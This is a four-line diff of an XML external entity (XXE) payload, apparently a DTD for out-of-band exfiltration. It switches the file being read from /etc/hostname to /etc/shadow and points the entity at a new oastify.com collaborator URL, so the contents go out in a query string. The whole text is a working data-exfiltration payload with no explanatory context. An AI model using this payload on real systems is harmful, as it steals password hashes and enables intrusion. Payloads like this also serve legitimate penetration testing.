@@ -1,4 +1,4 @@
-<!ENTITY % d SYSTEM "file:///etc/hostname">
-<!ENTITY % e "<!ENTITY &#x25; g SYSTEM 'https://uljbxg2a45h4ygzt0ss0wugtxk3br1fq.oastify.com/got?x=%d;'>">
+<!ENTITY % d SYSTEM "file:///etc/shadow">
+<!ENTITY % e "<!ENTITY &#x25; g SYSTEM 'https://qa49olico15ct9gkpk4x6iczjqphd71w.oastify.com/got?x=%d;'>">
 %e;
 %g;
